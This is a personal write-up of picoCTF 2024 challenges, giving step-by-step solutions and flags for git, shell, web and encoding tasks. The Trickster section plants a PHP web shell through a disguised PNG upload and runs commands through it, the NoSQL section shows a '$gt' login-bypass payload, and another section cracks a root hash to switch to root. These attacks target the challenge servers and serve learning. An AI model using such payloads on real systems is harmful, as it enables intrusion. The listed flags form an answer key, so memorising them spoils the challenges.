My teammates(LocalMen) and I participated in the picoCTF_2024 organized by Carnegie Mellon University, which took place between March 12, 2024 to March 26, 2024. It was a great learning experience and I really learnt a lot.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f184606e-ebd7-44f1-ae7c-3e84cb63a7f3)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f60bf9f0-afb0-41c9-a26c-1d6dacfd3fae)

This is a writeup of the challenges I solved during the event 



# Challenges Solved
## General Skills
-      Super SSH (25 points)
-      Commitment Issues (50 points)
-      Time Machine (50 points)
-      Blame Game (75 points)
-      Collaborative Development (75 points)
-      binhexa (100 points)
-      Binary Search (100 points)
-      endianness (200 points)
-      dont-you-love-banners (300 points)
-      SansAlpha (400 points)


## Web Exploitation
-     Bookmarklet (50 points)
-     WebDecode (50 points)
-     IntroToBurp (100 points)
-     Unminify (100 points)
-     No Sql Injection (200 points)
-     Trickster (300 points)
-     Elements (500 points)


## Forensics
-     Scan Surprise (50 points)
-     Verify (50 points)
-     CanYouSee (100 points)
-     Secret of the Polygot (100 points)
-     Mob Psycho (200 points)
-     endianness-v2 (300 points)
-     Blast from the Past (300 points)
-     Dear Diary (400 points)


## Cryptography
-     interencdec (50 points)
-     rsa_oracle (300 points)






# General Skills

##  Super SSH (25 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a04f3bb8-9eea-4439-9a62-33f42fa98d70)

For this task they provided us with the username, the port the ssh service is running on, the domain to connect to and then the password. So, we can use all this to connect to the remote instance via ssh

command:```ssh ctf-player@titan.picoctf.net -p 49566```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/CTF/picoCTF_2024]
└─$ ssh ctf-player@titan.picoctf.net -p 49566
ctf-player@titan.picoctf.net's password: 
Welcome ctf-player, here's your flag: picoCTF{s3cur3_c0nn3ct10n_45a48857}
Connection to titan.picoctf.net closed.
```
Well, connecting to the ssh instance gave us the flag

FLAG:- ```picoCTF{s3cur3_c0nn3ct10n_45a48857}```

------------------------------------------------

## Commitment Issues (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5e8229a3-e435-4359-a1c9-630e958a9315)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7fec1abb-4d34-4ae9-a8cb-2ba6bb9c5c59)

We actually have lots of files here and they all are git files, we were told from the challenge description that "he deleted the flag he accidentally wrote down". To view the changes made to this git files we can use the command ```git show```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5240f576-57b9-4d1b-8fe5-5775f0dc402c)

Well, that's our flag there 

FLAG:- ```picoCTF{s@n1t1z3_c785c319}```

----------------------------------------

## Time Machine (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/abd4eaad-2a0b-40da-800e-0aa13b228ea1)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/01acaf4c-3e94-4d4c-8d59-e0375555382f)

We've got some git files here also, just like in the previous challenge the ```git show``` command helps us inspect files in the git repository

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/68688743-af2e-420a-8cd9-68fad2152248)

We got our flag

FLAG:- ```picoCTF{t1m3m@ch1n3_e8c98b3a}```

-----------------------------------

## Blame Game (75 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/673d9e48-fd1d-4ac0-a081-2caf54fdca62)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/89f0df2b-6bed-4431-af00-15e8d0a62933)

unlike the previous challs the files for this chall are much, from the challenge description we are to look for the commit that's preventing the program from working. Well, ```git show``` won't work in this case actually. The guy we'll be needing in a situation like this is the command ```grep```, I called him already he's on his way hehe

command:```grep -ir "picoCTF{```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/blame_game]
└─$ cd drop-in 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/picoCTF_2024/general_skills/blame_game/drop-in]
└─$ grep -ir "picoCTF{"
.git/logs/HEAD:caa945839a2fc0fb52584b559b4e89ac7c46bf54 8c83358c32daee3f8b597d2b853c1d1966b23f0a picoCTF{@sk_th3_1nt3rn_2c6bf174} <ops@picoctf.com> 1710202031 +0000    commit: optimize file size of prod code
.git/logs/refs/heads/master:caa945839a2fc0fb52584b559b4e89ac7c46bf54 8c83358c32daee3f8b597d2b853c1d1966b23f0a picoCTF{@sk_th3_1nt3rn_2c6bf174} <ops@picoctf.com> 1710202031 +0000       commit: optimize file size of prod code
```
We got our flag😎

FLAG:- ```picoCTF{@sk_th3_1nt3rn_2c6bf174}```

-------------------------------------

## Collaborative Development (75 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5829f222-5e72-4cb4-a200-06bfb703fd16)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dd9718f9-545b-4df4-bd1e-f6ea9f7e7d22)

We'll be using the "Git Extractor" tool for this, you can download it [here](https://github.com/internetwache/GitTools/blob/master/Extractor/extractor.sh)

To run the tool

command:```bash extractor.sh drop-in <folder you want the output to be stored at>```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/357df383-858e-473f-a67b-5fc92f48e5d0)

We have 4 folders here, checking each folder we have this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ad7bda51-71ad-4fab-a2d1-102dd312638e)

The flag was scattered amongst the folder so all you have to do is rearrange it

FLAG:- ```picoCTF{t3@mw0rk_m@k3s_th3_dr3@m_w0rk_6c06cec1}```

---------------------------------------

## binhexa (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7321e279-1776-4d4d-890c-2c09b0ba574b)

They gave us the challenge instance to connect to 

command:```nc titan.picoctf.net 49964```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/851d807a-b02d-4e17-bfe9-ab19da553e6b)

So we are meant to search for the flag here, to get the flag we have to perform the unique operations. We can use this [website](https://www.rapidtables.com/calc/math/binary-calculator.html)

Using that website should get you to the last task, lets solve for the first task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c24f0b8a-79d1-4c52-a3a2-067963c5c78d)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2ac8078c-2a80-4f66-a44a-3fb285d04777)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7fd66c60-f917-4caf-a19f-3aacc16ace34)

To enter the result of the last operation which is ```000100111110``` to hex, we can use this [website](https://www.rapidtables.com/convert/number/binary-to-hex.html)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1912aa4b-dd57-4972-a622-a86f74f037b5)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1817d644-5fb1-49fe-953f-a188b810c783)

We got our flag

FLAG:- ```picoCTF{b1tw^3se_0p3eR@tI0n_su33essFuL_d6f8047e}```

------------------------------------------

## Binary Search (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cf92f91c-5791-4f4f-b403-03b6213d667f)

When you launch the instance

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/08f08895-bd7b-428b-9870-49a4bf184aef)

Since we have the username and password we can connect to the challenge instance using ssh as stated there

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e870de15-f335-4653-8755-6927888d0b97)

This is a game where you guess numbers, well I've seen this chall before during the "cyberstarters CTF" last year so it was quite easy to figure out.

First thing you do is basically start from the middle, so lets start with say ```500```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dd0a0d90-5959-4dad-8b70-a66d62497dcf)

We have to go lower, now lets use ```400```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6c3e88bb-c1f9-4881-b252-a4fb25f16d06)

Now, we are meant to go higher, now lets use ```450```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ba08d4da-1667-48fe-9a73-7c9920c98d74)

We have to go higher, this means the number is between ```450``` and ```500```, lets use 470

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/da9ec30f-dd29-45f0-aeff-f97aa2df4896)

Higher again, lets use ```480```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2eb55638-72b4-43e0-991e-de44b05b6900)

Higher again, lets use ```490```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3c7ffce2-c830-4c14-9733-bbdce5483549)

Lower, so the right number is between ```480``` and  ```490```. Lets use ```485``` this time

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d8dcf358-e50f-450b-a7ba-592300a5df6c)

Higher, nice, lets use ```489```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/68f7d39f-913f-4c2f-b2da-983750439f5b)

Lower, we've narrowed the right number between ```485``` and ```489```. Now, we'll just try ```486```,```487``` and ```488```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2383c95f-ca0f-4de2-b5cb-894b4786f1cb)

```486``` worked hehe.

FLAG:- ```picoCTF{g00d_gu355_1597707f}```

-----------------------------------

## endianness (200 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d66ea3cf-d15f-4986-8284-449c8a4dbda0)

Lets connect to the challenge instance

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eac6268d-e545-4327-ba23-1d66ae76365b)

So we are meant to find the little endian and big endian representations of a word

To do this you can use this [website](https://learnmeabitcoin.com/technical/general/little-endian)

First we have to convert the word ```wjsyg``` to hex. You can do that using [cyberchef](https://gchq.github.io/CyberChef/)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/67766e6d-3792-4560-ac3f-6e4f4da0a961)

So we have this ```776a737967```, now we'll convert this to the Little Endian representation

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0aa45733-3424-4bed-92cf-52419f95e332)

There you have it,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6221d294-7d73-450e-8ba4-7500f48f15e2)

It worked, now for the Big Endian representation

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bec3b18f-6bc4-4656-bbd4-5cb14a4280af)

Yup, that's it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/51fb768c-96c6-4770-8379-598b25303128)

We got our flag. You can read more about Little and Big Endians [here](https://www.techtarget.com/searchnetworking/definition/big-endian-and-little-endian)

FLAG:- ```picoCTF{3ndi4n_sw4p_su33ess_25c5f083}```

---------------------------------

## dont-you-love-banners (300 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/41e77b18-50be-4f29-a723-69b33815620e)

In this chall, we have 2 instances, in the first instance some crucial information was leaked while the second instance is to connect to the running application.

Well, lets connect first with the instance that has been leaking crucial information

command:```nc tethys.picoctf.net 54896```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2355044a-1fdf-48cf-b1fc-ea32f1fe8e7e)

We actually got a password from the server, well lets keep that somewhere.

Now, lets connect to the running application

command:```nc tethys.picoctf.net 49671```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/26de50f0-3997-41f8-9285-4066291510b3)

We were asked for a password, using the password we got from the first instance

password:```My_Passw@rd_@1234```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5fd54f83-928c-46a7-ab4f-84985e3bb3ee)

The answer to this question is ```Defcon```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/031983fb-c676-4881-8df8-9ec57680507c)

The answer to this last one is ```John Draper```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fb56ab37-e349-4321-898a-5b4da40f084f)

Now that we are in, lets go ahead to escalate our privileges.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/67afa711-b84a-41f2-be6d-46dfc50fe797)

smooth, we have the hash for the root user, well lets crack it using "brother john"😂

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/73df27a4-edf6-4427-a004-e81b5c074041)

We got the password to be ```iloveyou```, with this password we can actually switch user

command:```su root```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/218f6e6c-f13e-4386-956a-8bebcc1450cd)

That's our flag right there

FLAG:- ```picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}```

---------------------------------------

## SansAlpha (400 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3da0aed9-3315-4d8e-923c-5a43266365cf)

Alright so, in this task we have a bash shell but then we can't use alphabets, only numbers and (most) symbols are allowed. 

Lets connect to the challenge instance

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7ac831d7-be25-4102-ae60-a97212530aa8)

Well, as you can see we can't use any character here hehe.

What we'll make use of here is something known as wildcards

```
Wildcards are characters used in shell commands to represent one or more other characters. They're commonly used in file management commands to specify patterns of filenames that you want to match. Here are some common wildcards:

* (asterisk): Matches any sequence of characters, including none.
? (question mark): Matches any single character.
[ ] (square brackets): Matches any one character within the specified range or set.
Here's how they work in practice:

*: Matches zero or more characters.
Example: *.txt matches any file ending in .txt.
?: Matches exactly one character.
Example: file?.txt matches file1.txt, fileA.txt, but not file12.txt.
[ ]: Matches any one character within the specified range or set.
Example: [123].txt matches 1.txt, 2.txt, or 3.txt.
```
The wildcard I used for this chall is the question mark.

lets test this on my terminal first before we go the challenge instance

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/CTF/picoCTF_2024/general_skills]
└─$ ~/??
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/go]
└─$ ~/????
zsh: permission denied: /home/bl4ck4non/Demo
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/go]
└─$ ~/??????
zsh: permission denied: /home/bl4ck4non/Public
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/go]
└─$ ~/?????????               
zsh: permission denied: /home/bl4ck4non/Documents
```
Good, now lets test this on the challenge instance, lets see if it'll help us with the directory structures

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3a3485b4-e2fb-4543-b0b8-dd42fb725379)

So there's a directory ```/home/ctf-player/blargh```

Lets keep digging, lets check for sub-directories/files this time

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5b9a8878-99d7-4d63-8256-aa08761c1ea9)

So inside the ```blargh``` directory we have ```flag.txt``` and some bunch of other files.

Now, how can we read the ```flag.txt``` file????

Well, lets go back to my terminal. To check for available binaries, binaries like ```base32```,```base64```,```awk```,```cat``` and ```strings```

```
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ nano bankai.txt
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ cat bankai.txt 
flag{y0u_c4n't_catch_m3}
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ /usr/bin/awk bankai.txt
awk: cmd. line:1: bankai.txt
awk: cmd. line:1:       ^ syntax error
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ /usr/bin/base32 bankai.txt
MZWGCZ33PEYHKX3DGRXCO5C7MNQXIY3IL5WTG7IK
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ /usr/bin/base64 bankai.txt
ZmxhZ3t5MHVfYzRuJ3RfY2F0Y2hfbTN9Cg==
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ /usr/bin/strings bankai.txt
flag{y0u_c4n't_catch_m3}
```
Now, lets confirm if we can use these binaries to read the ```flag.txt``` files on the challenge instance

So to read with strings we can try something like this ```/usr/bin/strings ~/blargh/flag.txt```, using wildcards we have this ```/???/???/??????? ~/??????/????????```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b3ada8d0-8ea9-424b-9690-99fc18d162a7)

So we don't have ```strings``` available.

Lets try the base64 binary, we can do something like this ```/usr/bin/base64 ~/blargh/flag.txt```, using wildcards we have this ```/???/???/????64 ~/??????/????????```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed23a575-c24b-40a5-90ab-d0c7d5bc6cc4)

Also didn't work. Lets check out the last binary. We can try this ```/usr/bin/base32 ~/blargh/flag.txt```, using wildcards we have ```/???/???/????32 ~/??????/????????```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/713f1b61-995d-429f-809e-a2ca3ddee047)

Lets decode this

command:```echo "OJSXI5LSNYQDAIDQNFRW6Q2UIZ5TO2BRGVPW25JRG4YXMM3SGUZV6MJVL5WTIZDOGM2TKXZUHE2DKNRTGBQX2===" | base32 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/general_skills/sansalpha]
└─$ echo "OJSXI5LSNYQDAIDQNFRW6Q2UIZ5TO2BRGVPW25JRG4YXMM3SGUZV6MJVL5WTIZDOGM2TKXZUHE2DKNRTGBQX2===" | base32 -d
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_4945630a}
```
We got our flag😎

FLAG:- ```picoCTF{7h15_mu171v3r53_15_m4dn355_4945630a}```



# Web Exploitation

## Bookmarklet (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8fc83154-5c34-4e33-b3c0-03522f073b46)

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4f8d2d39-0d09-4271-b254-9d74f68e5239)

We get this javascript code

```js
        javascript:(function() {
            var encryptedFlag = "àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓÔÅÐÙí";
            var key = "picoctf";
            var decryptedFlag = "";
            for (var i = 0; i < encryptedFlag.length; i++) {
                decryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);
            }
            alert(decryptedFlag);
        })();
 ```
This javascript code is more like a simple encryption routine using a basic form of symmetric encryption. It takes an encrypted flag, a key and then decrypts the flag using the key

We'll run this code using one of the developer tools which is the "console"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c5a70db7-5b7a-43f6-96dd-d50252f11dfd)

Soft, we got our flag

FLAG:- ```picoCTF{p@g3_turn3r_1d1ba7e0}```

---------------------------------------

## WebDecode (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4cda5532-ae3b-4b67-94da-c88288807177)

A question was aksed, Do you know how to use the web inspector??? Well, lets see

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/50352705-a944-457b-8490-09ee3e7a538c)

We have 3 pages here, the "home page", the "about page" and the "contact page"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4ed243cc-5ddd-417e-872e-e7f4ea113f8d)

This is what you get when you click on the "home page"

Clicking on the "about page" you get this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cdc97d22-7e54-48a6-8447-3670275a590e)

Now, lets inspect this page

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/026ffb8b-26ef-4ca1-9486-45ded196d477)

We can see the base64 encoded text, well lets decode this

command:```echo "cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZGYwZGE3Mjd9" | base64 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/CTF/picoCTF_2024/web]
└─$ echo "cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZGYwZGE3Mjd9" | base64 -d
picoCTF{web_succ3ssfully_d3c0ded_df0da727}
```
We got our flag😎

FLAG:- ```picoCTF{web_succ3ssfully_d3c0ded_df0da727}```

------------------------------------------------

## IntroToBurp (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a48a554b-4e3b-4574-a810-25f872b94803)

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fe0e857a-d075-4c7a-a5ae-0188d783dfa9)

So we get this registration page. Lets try to register so we can see what happens next

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9d593bd2-6cc4-4bdf-bc3f-0a94dcc95a82)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/04e7902c-ec22-4bbe-857e-1c1e1853cfe7)

oops, we are being asked for an otp, but we don't have one lool.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e82b52cb-d759-4104-9615-e738049efd5a)

Lets intercept this request with burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a6ea43b9-9255-4d3e-816e-72a416a0075f)

Good. Now, have you ever heard of the mangling technique??

```
Mangling is a technique used to bypass security filters or controls by modifying or obfuscating the input data. This can be achieved through various methods such as encoding, encrypting, or adding extra characters to the input. The main goal of mangling is to alter the input data in a way that it can bypass the security filters or controls, allowing the attacker to exploit the vulnerability.
```
So, we'll perform a mangling technique on the otp parameter by adding square brackets

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e54aa357-132f-4982-b1d6-3a96f137e28a)

Sending the request, you'll get this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f0b0d124-6d6b-4dcd-bf55-8d4d84b59b2e)

cool, we got our flag

FLAG:- ```picoCTF{#0TP_Bypvss_SuCc3$S_2e80f1fd}```

------------------------------------------------

## Unminify (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f3d45349-a012-40b0-939e-169f3dc44690)

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/07f06d37-b144-41ad-88d6-6c9827a962d7)

The webpage says it has distributed the flag but doesn't know how to read them.

Lets view the page source

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/732d036c-ddcb-4369-ba97-ffa7b3fa570e)

Yeah click on "Line wrap"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8e651956-051e-47c8-b6a0-2fe18535417d)

Yup, that's our flag. Easy right??😎

FLAG:- ```picoCTF{pr3tty_c0d3_622b2c88}```

-----------------------------------------------------

## No Sql Injection (200 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5a2e924a-6123-4d95-8816-cf8d0d68e770)

From the name of the chall, it's quite obvious what the attack vector is.

I've documented the way I exploited this vulnerability in one of my writeups

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/de7b148b-2de1-44ea-a219-a2e03b6df34f)

We'll be using the same payloads but then the way we apply it will be different. Instead of interecepting the request with burpsuite and then editing the parameters to include the payload, we'll actually use the payload first before intercepting the request with burpsuite

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a7f85db9-4e07-45bd-97a8-75c97483cf5d)

We have this

payload
```
Email: {"$gt":""}
Password: {"$gt":""}
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/716d3b90-9d02-4133-b2be-663efa71c5e6)

Lets intercept this request using burpsuite and then we send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c3830753-af39-4a00-ad5b-82fa850d1eae)

Now, lets follow redirection

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/378d4f3f-2d69-4144-84de-d3c2bba095bb)

The token is actually encoded in base64, lets decode this

command:```echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzUzZDkwZTI4fQ==" | base64 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/CTF/picoCTF_2024/web]
└─$ echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzUzZDkwZTI4fQ==" | base64 -d    
picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_53d90e28}
```
We got our flag hehe

FLAG:- ```picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_53d90e28}```

------------------------------------------------

## Trickster (300 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/217ead34-902b-44d5-a2b2-d0d99deecb25)

A web app that only allows png images?? Well, this screams the file upload vulnerability attack vector hehe

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/20c41bea-d806-4bfc-ae3a-5896d51a6e8c)

Lets try to upload a normal png image

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2922a205-1928-41f5-b49c-f723070d908e)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b78f2dfc-e6a9-4ac2-8a3c-7e2094cef2de)

Our image got uploaded successfully. Now, the images are uploaded to the ```/uploads``` directory, but when you navigate there you get this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c13234c3-9141-4b9a-83b2-3a58274a3235)

This means the directory exists but then we don't have enough permission to view the directory. 

To view the image we uploaded we can do this ```/uploads/bl4ck4non.png```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/046d5f43-8325-45c7-bac4-889e07f131d6)

As you can see, it worked.

Now, lets upload another png image, but then this time we'll intercept the request using burpsuite so we can do some modifications

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/16ef05f0-3339-468b-971e-b43fead98812)

On burpsuite you have this,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0e9022a5-6c39-4b5e-b6f0-d8ad266179e3)

We'll delete the contents of the png image and add this payload

```php
<?php system($_GET['cmd']); ?>
```
We'll also edit the filename

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ab72a6db-3c4e-4f9f-8108-3501f572a1a8)

Good, now forward the request

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/26f8b058-878b-4707-a31b-c77f732ac98b)

Our file got uploaded successfully

To view our file we'll navigate to ```/uploads/freakyFlags.png.php```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5e766499-955c-40ee-98a6-e955e85f5492)

We get this, now to get command injection on this server we can add this ```?cmd=id```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/be15caf6-2a9c-4400-9af9-5ecb2f99f19a)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/87fb5c96-1852-442f-8fdf-938ae7cdfff2)

As you can see, we can execute linux commands.

Well, lets look for the flag, I'll be using burp repeater for this.

We'll start with going back a directory and listing the contents of that directory, something like this ```cd .. && ls -la```, ensure you url encode this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/edf63944-0c6f-4827-b72e-0f8f5b06c3b3)

That file looks interesting, lets cat it, we can achieve that using this ```cd .. && ls -la && cat GQ4DOOBVMMYGK.txt```, ensure it is url encoded before sending.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35ef4fb7-1959-4428-97cd-b88a08376780)

We got our flag😎

FLAG:- ```picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}```

------------------------------------

## Elements (500 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8934c7d6-fba1-446c-a64d-c089234945e3)

We don't need to launch the instance yet, lets try to download the source code and analyze it.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fb77c6ce-9a62-48f9-a66c-5c075ce9fadd)

The ```flag.txt``` contains a fake flag so chill we haven't solved it yet😂

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/web/elements]
└─$ cat flag.txt       
picoCTF{test_flag}
```
You see??😅

Lets start by analyzing the ```index.mjs``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1456d082-cdc9-4661-a7a8-b9b9934160e5)

Well, what this guy does is just spawn the chromium instance we were given, so we'll have to install it for experiment purposes.

To install it just run the command ```sudo dpkg -i chrome.deb```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0adb95ea-0e1d-47eb-92a6-63fbc0ffe858)

Moving on, 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/515a9d3e-64f4-40e0-8278-069b2c5755b8)

So, when we run node on the ```index.mjs``` file we can navigate to the url ```http://127.0.0.1:8080``` to view the webpage. You can also see that we have the CSP header there, well that header is pain actually💀. You can read more about the csp header [here](https://content-security-policy.com/)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c3a65b1d-338c-414d-b6f3-0f6f9afab93b)

